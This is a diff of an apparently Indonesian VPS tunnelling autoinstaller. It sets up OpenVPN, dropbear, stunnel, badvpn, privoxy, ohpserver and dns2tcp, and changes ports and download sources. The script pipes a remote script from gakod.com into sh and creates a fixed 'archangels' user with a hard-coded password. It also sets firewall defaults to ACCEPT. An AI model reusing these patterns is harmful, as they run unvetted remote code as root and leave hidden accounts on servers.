@@ -103,20 +103,21 @@ service php7.0-fpm restart
 #  openvpn
 apt-get -y install openvpn
 cd /etc/openvpn/
-wget -O openvpn.tar "https://raw.githubusercontent.com/89870must73/FILENEW/main/openvpn.tar"
+wget -O openvpn.tar "https://raw.githubusercontent.com/Vpaproject/-/main/openvpn.tar"
 tar xf openvpn.tar;rm openvpn.tar
 wget -O /etc/rc.local "https://raw.githubusercontent.com/guardeumvpn/Qwer77/master/rc.local"
 chmod +x /etc/rc.local
 # etc
-wget -O /home/vps/public_html/tcp.ovpn "https://raw.githubusercontent.com/89870must73/FILENEW/main/client.ovpn"
-wget -O /home/vps/public_html/udp.ovpn "https://raw.githubusercontent.com/89870must73/FILENEW/main/client1.ovpn"
-wget -O /home/vps/public_html/ssl.ovpn "https://raw.githubusercontent.com/azalea910512/kia/main/zvs/ssl.ovpn"
+wget -O /home/vps/public_html/tcp.ovpn "https://raw.githubusercontent.com/Vpaproject/-/main/client.ovpn"
+wget -O /home/vps/public_html/udp.ovpn "https://raw.githubusercontent.com/Vpaproject/-/main/client1.ovpn"
+wget -O /home/vps/public_html/ssl.ovpn "https://raw.githubusercontent.com/Vpaproject/-/main/ssl.ovpn"
+wget -O /home/vps/public_html/ohp.ovpn "https://raw.githubusercontent.com/Vpaproject/-/main/ohp.ovpn"
 wget -O /home/vps/public_html/client3.ovpn "https://gakod.com/debian/client3.ovpn"
 sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
 sed -i "s/ipserver/$myip/g" /home/vps/public_html/tcp.ovpn
 sed -i "s/ipserver/$myip/g" /home/vps/public_html/udp.ovpn
 sed -i "s/ipserver/$myip/g" /home/vps/public_html/ssl.ovpn
-sed -i "s/ipserver/$myip/g" /home/vps/public_html/client3.ovpn
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/ohp.ovpn
 useradd -m -g users -s /bin/bash archangels
 echo "7C22C4ED" | chpasswd
 echo "UPDATE DAN INSTALL SIAP 99% MOHON SABAR"
@@ -125,7 +126,7 @@ cd;rm *.sh;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
 # Setting UFW
 apt-get install ufw
 ufw allow ssh
-ufw allow 443/tcp
+ufw allow 1103/tcp
 sed -i 's|DEFAULT_INPUT_POLICY="DROP"|DEFAULT_INPUT_POLICY="ACCEPT"|' /etc/default/ufw
 sed -i 's|DEFAULT_FORWARD_POLICY="DROP"|DEFAULT_FORWARD_POLICY="ACCEPT"|' /etc/default/ufw
 cat > /etc/ufw/before.rules <<-END
@@ -145,44 +146,6 @@ ufw disable
 echo 1 > /proc/sys/net/ipv4/ip_forward
 sed -i 's|#net.ipv4.ip_forward=1|net.ipv4.ip_forward=1|' /etc/sysctl.conf
 
-# OpenVPN monitoring
-# apt-get install -y gcc libgeoip-dev python-virtualenv python-dev geoip-database-extra uwsgi uwsgi-plugin-python
-# wget -O /srv/openvpn-monitor.tar "https://gakod.com/all/premium/openvpn-monitor.tar"
-# cd /srv
-# tar xf openvpn-monitor.tar
-# cd openvpn-monitor
-# virtualenv .
-# . bin/activate
-# pip install -r requirements.txt
-# wget -O /etc/uwsgi/apps-available/openvpn-monitor.ini "https://gakod.com/all/premium/openvpn-monitor.ini"
-# ln -s /etc/uwsgi/apps-available/openvpn-monitor.ini /etc/uwsgi/apps-enabled/
-
-# Install BadVPN
-apt-get -y install cmake make gcc
-wget https://raw.githubusercontent.com/GegeEmbrie/autosshvpn/master/file/badvpn-1.999.127.tar.bz2
-tar xf badvpn-1.999.127.tar.bz2
-mkdir badvpn-build
-cd badvpn-build
-cmake ~/badvpn-1.999.127 -DBUILD_NOTHING_BY_DEFAULT=1 -DBUILD_UDPGW=1
-make install
-screen badvpn-udpgw --listen-addr 127.0.0.1:7300 > /dev/null &
-cd
-
-# setting port ssh
-sed -i '/#Port 22/a Port 143' /etc/ssh/sshd_config
-sed -i '/#Port 22/a Port  90' /etc/ssh/sshd_config
-sed -i 's/#Port 22/Port  22/g' /etc/ssh/sshd_config
-/etc/init.d/ssh restart
-
-# install dropbear
-apt -y install dropbear
-sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
-sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=143/g' /etc/default/dropbear
-sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 109"/g' /etc/default/dropbear
-echo "/bin/false" >> /etc/shells
-echo "/usr/sbin/nologin" >> /etc/shells
-/etc/init.d/dropbear restart
-
 # install squid
 apt-get -y install squid
 cat > /etc/squid/squid.conf <<-END
@@ -191,7 +154,6 @@ acl checker src 188.93.95.137
 acl ports_ port 14 22 53 21 8080 8081 8000 3128 1193 1194 440 441 442 443 80
 http_port 3128
 http_port 8000
-http_port 8080
 http_port 8888
 access_log none
 cache_log /dev/null
@@ -217,12 +179,12 @@ sed -i $MYIP2 /etc/squid/squid.conf;
 service squid restart
 
 # installing webmin
-wget "https://gakod.com/premium/webmin_1.801_all.deb"
-dpkg --install webmin_1.801_all.deb;
-apt-get -y -f install;
-sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
-rm /root/webmin_1.801_all.deb
-service webmin restart
+# wget "https://gakod.com/premium/webmin_1.801_all.deb"
+# dpkg --install webmin_1.801_all.deb;
+# apt-get -y -f install;
+# sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf
+# rm /root/webmin_1.801_all.deb
+# service webmin restart
 
 #pivpn
 # curl https://raw.githubusercontent.com/pivpn/pivpn/master/auto_install/install.sh | bash
@@ -238,6 +200,20 @@ service webmin restart
 # wget -O /etc/openvpn/ "https://raw.githubusercontent.com/HRomie/obfs4proxy-openvpn/master/obfs4proxy-openvpn"
 # chmod +x /etc/openvn/obfs4proxy-openvpn
 
+# setting port ssh
+sed -i '/#Port 22/a Port 143' /etc/ssh/sshd_config
+sed -i '/#Port 22/a Port  90' /etc/ssh/sshd_config
+sed -i 's/#Port 22/Port  22/g' /etc/ssh/sshd_config
+/etc/init.d/ssh restart
+
+# install dropbear
+apt-get -y install dropbear
+sed -i 's/NO_START=1/NO_START=0/g' /etc/default/dropbear
+sed -i 's/DROPBEAR_PORT=22/DROPBEAR_PORT=442/g' /etc/default/dropbear
+sed -i 's/DROPBEAR_EXTRA_ARGS=/DROPBEAR_EXTRA_ARGS="-p 109 -p 110 -p 80"/g' /etc/default/dropbear
+echo "/bin/false" >> /etc/shells
+/etc/init.d/dropbear restart
+
 # install stunnel
 apt install stunnel4 -y
 cat > /etc/stunnel/stunnel.conf <<-END
@@ -247,21 +223,17 @@ socket = a:SO_REUSEADDR=1
 socket = l:TCP_NODELAY=1
 socket = r:TCP_NODELAY=1
 
-#[stunnelws]
-#accept = 443
-#connect = 127.0.0.1:8880
-
 [dropbear]
-accept = 445
+accept = 446
 connect = 127.0.0.1:109
 
 [dropbear]
-accept = 990
-connect = 127.0.0.1:109
+accept = 777
+connect = 127.0.0.1:22
 
 [openvpn]
-accept = 992
-connect = 127.0.0.1:1194
+accept = 587
+connect = 127.0.0.1:1103
 
 END
 
@@ -274,7 +246,38 @@ cat key.pem cert.pem >> /etc/stunnel/stunnel.pem
 # konfigurasi stunnel
 sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4
 /etc/init.d/stunnel4 restart
+cd
 
+#install badvpn deb/ubun
+apt-get install cmake make gcc -y
+cd
+wget https://github.com/ambrop72/badvpn/archive/1.999.130.tar.gz
+tar xzf 1.999.130.tar.gz
+mkdir badvpn-build
+cd badvpn-build
+cmake ~/badvpn-1.999.130 -DBUILD_NOTHING_BY_DEFAULT=1 -DBUILD_UDPGW=1
+make install
+sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7000 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &' /etc/rc.local
+sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7100 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &' /etc/rc.local
+sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7200 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &' /etc/rc.local
+sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &' /etc/rc.local
+sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7400 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &' /etc/rc.local
+sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7500 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &' /etc/rc.local
+sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7600 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &' /etc/rc.local
+sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7700 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &' /etc/rc.local
+sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7800 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &' /etc/rc.local
+sed -i '$ i\screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7900 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &' /etc/rc.local
+chmod +x /usr/local/bin/badvpn-udpgw
+screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7000 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &
+screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7100 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &
+screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7200 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &
+screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &
+screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7400 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &
+screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7500 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &
+screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7600 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &
+screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7700 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &
+screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7800 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &
+screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7900 --max-clients 1000 --max-connections-for-client 1000 > /dev/null &
 
 # install fail2ban
 apt-get -y install fail2ban
@@ -294,9 +297,9 @@ sed -i 's@#Banner none@Banner /etc/banner@g' /etc/ssh/sshd_config
 sed -i 's@DROPBEAR_BANNER=""@DROPBEAR_BANNER="/etc/banner"@g' /etc/default/dropbear
 
 # Webmin Configuration
-sed -i '$ i\dope: acl adsl-client ajaxterm apache at backup-config bacula-backup bandwidth bind8 burner change-user cluster-copy cluster-cron cluster-passwd cluster-shell cluster-software cluster-useradmin cluster-usermin cluster-webmin cpan cron custom dfsadmin dhcpd dovecot exim exports fail2ban fdisk fetchmail file filemin filter firewall firewalld fsdump grub heartbeat htaccess-htpasswd idmapd inetd init inittab ipfilter ipfw ipsec iscsi-client iscsi-server iscsi-target iscsi-tgtd jabber krb5 ldap-client ldap-server ldap-useradmin logrotate lpadmin lvm mailboxes mailcap man mon mount mysql net nis openslp package-updates pam pap passwd phpini postfix postgresql ppp-client pptp-client pptp-server proc procmail proftpd qmailadmin quota raid samba sarg sendmail servers shell shorewall shorewall6 smart-status smf software spam squid sshd status stunnel syslog-ng syslog system-status tcpwrappers telnet time tunnel updown useradmin usermin vgetty webalizer webmin webmincron webminlog wuftpd xinetd' /etc/webmin/webmin.acl
-sed -i '$ i\dope:x:0' /etc/webmin/miniserv.users
-/usr/share/webmin/changepass.pl /etc/webmin dope 12345
+# sed -i '$ i\dope: acl adsl-client ajaxterm apache at backup-config bacula-backup bandwidth bind8 burner change-user cluster-copy cluster-cron cluster-passwd cluster-shell cluster-software cluster-useradmin cluster-usermin cluster-webmin cpan cron custom dfsadmin dhcpd dovecot exim exports fail2ban fdisk fetchmail file filemin filter firewall firewalld fsdump grub heartbeat htaccess-htpasswd idmapd inetd init inittab ipfilter ipfw ipsec iscsi-client iscsi-server iscsi-target iscsi-tgtd jabber krb5 ldap-client ldap-server ldap-useradmin logrotate lpadmin lvm mailboxes mailcap man mon mount mysql net nis openslp package-updates pam pap passwd phpini postfix postgresql ppp-client pptp-client pptp-server proc procmail proftpd qmailadmin quota raid samba sarg sendmail servers shell shorewall shorewall6 smart-status smf software spam squid sshd status stunnel syslog-ng syslog system-status tcpwrappers telnet time tunnel updown useradmin usermin vgetty webalizer webmin webmincron webminlog wuftpd xinetd' /etc/webmin/webmin.acl
+# sed -i '$ i\dope:x:0' /etc/webmin/miniserv.users
+# /usr/share/webmin/changepass.pl /etc/webmin dope 12345
 
 # Setting IPtables
 cat > /etc/iptables.up.rules <<-END
@@ -368,6 +371,156 @@ apt-get install -y libxml-parser-perl
 cd
 wget https://gakod.com/all/premium/install-premiumscript.sh -O - -o /dev/null|sh
 
+clear
+DISTRO=`awk '/^ID=/' /etc/*-release | awk -F'=' '{ print tolower($2) }'`
+SERVER_IP=`ip -o route get to 8.8.8.8 | sed -n 's/.*src \([0-9.]\+\).*/\1/p'`
+
+# Welcome Message
+echo 'Welcome to WhyTzy96 Script'
+echo 'Script Version: 0.1'
+echo 'Updated on: 07/08/2021'
+
+# Verify Distro
+if ! [[ $DISTRO == "ubuntu" || $DISTRO == "debian" ]]; then
+	echo 'This script works only on Debian/Ubuntu OS'
+	exit 1
+fi
+
+# Check if root
+if [ "$(id -u)" != "0" ]; then
+   echo "This script must be run as root" 1>&2
+   exit 1
+fi
+
+
+if test -f "/root/.tcat_installed"; then
+	echo 'TunnelCat VPN Software already installed!'
+	exit 1
+fi
+
+#PORT SERVER
+read -e -p 'Input your Server IP: ' -i $SERVER_IP SERVER_IP
+read -e -p 'Input OpenVPN TCP Port: ' -i '1103' OPENVPN_PORT
+read -e -p 'Input Privoxy Port: ' -i '8081' PRIVOXY_PORT
+read -e -p 'Input ohpserver Port: ' -i '7752' OHP_PORT
+read -e -p 'Input stunnel Port: ' -i '443' STUNNEL_PORT
+read -e -p 'Input DNS Tunnel Domain: ' -i 'dns.tunnel.example.com' DNS_TUNNEL_DOMAIN
+
+# Check input
+echo 'Checking Input...'
+if ! [[ $SERVER_IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+	echo 'Server IP is invalid'
+	exit 1
+fi
+
+if ! [[ $OPENVPN_PORT =~ ^[0-9]+$ || $OHP_PORT =~ ^[0-9]+$ || $PRIVOXY_PORT =~ ^[0-9]+$ || $STUNNEL_PORT =~ ^[0-9]+$ ]]; then
+	echo 'Port is invalid'
+	exit 1
+fi
+
+echo 'Proceeding with the installation of dependencies'
+
+# Install Dependencies
+echo 'Installing Dependencies'
+DEBIAN_FRONTEND=noninteractive apt install -y resolvconf privoxy stunnel unzip iproute2 dns2tcp
+echo 'Dependencies Installed!' 
+
+# Install TunnelCat VPN Software
+echo 'Installing ohpserver'
+wget https://github.com/lfasmpao/open-http-puncher/releases/download/0.1/ohpserver-linux32.zip
+unzip ohpserver-linux32.zip
+rm ohpserver-linux32.zip
+mv ohpserver /usr/local/bin/
+chmod +x /usr/local/bin/ohpserver
+
+# Setup Privoxy
+echo 'Setting up Privoxy'
+mkdir /etc/privoxy/
+cat <<EOF > /etc/privoxy/config
+user-manual /usr/share/doc/privoxy/user-manual
+confdir /etc/privoxy
+logdir /var/log/privoxy
+actionsfile match-all.action
+actionsfile default.action
+actionsfile user.action
+filterfile default.filter
+filterfile user.filter
+logfile logfile
+listen-address  :$PRIVOXY_PORT
+toggle 1
+enable-remote-toggle  0
+enable-remote-http-toggle  0
+enable-edit-actions 0
+enforce-blocks 0
+buffer-limit 4096
+enable-proxy-authentication-forwarding 0
+forwarded-connect-retries  0
+accept-intercepted-requests 0
+allow-cgi-request-crunching 0
+split-large-forms 0
+keep-alive-timeout 5
+tolerate-pipelining 1
+socket-timeout 300
+EOF
+
+cat <<EOF1 > /etc/privoxy/user.action
+{ +block }
+/
+{ -block }
+*.tcat.me
+127.0.0.1
+$SERVER_IP
+EOF1
+
+# Setup ohpserver
+echo 'Setup ohpserver'
+cat <<EOF > /etc/systemd/system/ohpserver.service
+[Unit]
+Description=Daemonize OpenHTTP Puncher Server
+Wants=network.target
+After=network.target
+[Service]
+ExecStart=/usr/local/bin/ohpserver -port $OHP_PORT -proxy 127.0.0.1:$PRIVOXY_PORT -tunnel $SERVER_IP:$OPENVPN_PORT
+Restart=always
+RestartSec=3
+[Install]
+WantedBy=multi-user.target
+EOF
+
+echo 'Setup dns2tcp'
+cat <<EOF > /etc/dns2tcpd.conf
+listen = 0.0.0.0
+port = 53
+user = nobody
+chroot = /tmp
+pid_file = /var/run/dns2tcp.pid
+domain = $DNS_TUNNEL_DOMAIN
+resources = ovpn:$SERVER_IP:$OPENVPN_PORT
+EOF
+
+# Start Services
+echo 'Running Services'
+echo "nameserver 8.8.8.8" > /etc/resolvconf/resolv.conf.d/head
+systemctl daemon-reload
+systemctl restart resolvconf
+systemctl restart stunnel4
+systemctl restart privoxy
+systemctl start ohpserver
+systemctl stop systemd-resolved
+systemctl start dns2tcp
+
+# Enable on boot
+echo 'Start services on boot'
+systemctl enable stunnel4
+systemctl enable privoxy
+systemctl enable dns2tcp
+systemctl enable ohpserver
+
+
+# Installed
+echo '' > /root/.tcat_installed
+
+
 # finishing
 cd
 chown -R www-data:www-data /home/vps/public_html
@@ -379,8 +532,6 @@ chown -R www-data:www-data /home/vps/public_html
 /etc/init.d/fail2ban restart
 /etc/init.d/stunnel4 restart
 service php7.0-fpm restart
-service uwsgi restart
-systemctl daemon-reload
 service squid restart
 /etc/init.d/webmin restart
 
@@ -412,7 +563,7 @@ echo "   - Auto-Reboot : [OFF]"  | tee -a log-install.txt
 echo "   - IPv6        : [OFF]"  | tee -a log-install.txt
 echo ""  | tee -a log-install.txt
 echo "Application & Port Information"  | tee -a log-install.txt
-echo "   - OpenVPN     : TCP 443"  | tee -a log-install.txt
+echo "   - OpenVPN     : TCP 1103"  | tee -a log-install.txt
 echo "   - OpenSSH     : 22, 90, 143"  | tee -a log-install.txt
 echo "   - Stunnel4    : 444"  | tee -a log-install.txt
 echo "   - Dropbear    : 80, 109, 110, 442"  | tee -a log-install.txt
@@ -438,6 +589,14 @@ echo "   - Simple Panel            : http://$MYIP:85/"  | tee -a log-install.txt
 echo "   - Openvpn Monitor         : http://$MYIP:89/"  | tee -a log-install.txt
 echo "   - Webmin                  : http://$MYIP:10000/"  | tee -a log-install.txt
 echo "   - Installation Log        : cat /root/log-install.txt"  | tee -a log-install.txt
+echo 'Installation OHP Information'
+echo '##############################'
+echo 'Server IP:' $SERVER_IP
+echo 'OpenVPN Port:' $OPENVPN_PORT
+echo 'HTTP Port:' $PRIVOXY_PORT
+echo 'OHP Port:' $OHP_PORT
+echo 'stunnel Port:' $STUNNEL_PORT
+echo 'DNS Tunnel Domain:' $DNS_TUNNEL_DOMAIN
 echo ""  | tee -a log-install.txt
 echo "----------------- Script By JokerTeam(t.me/Jo3k3r)  -----------------"
 echo "                              Script By JokerTeam                             "
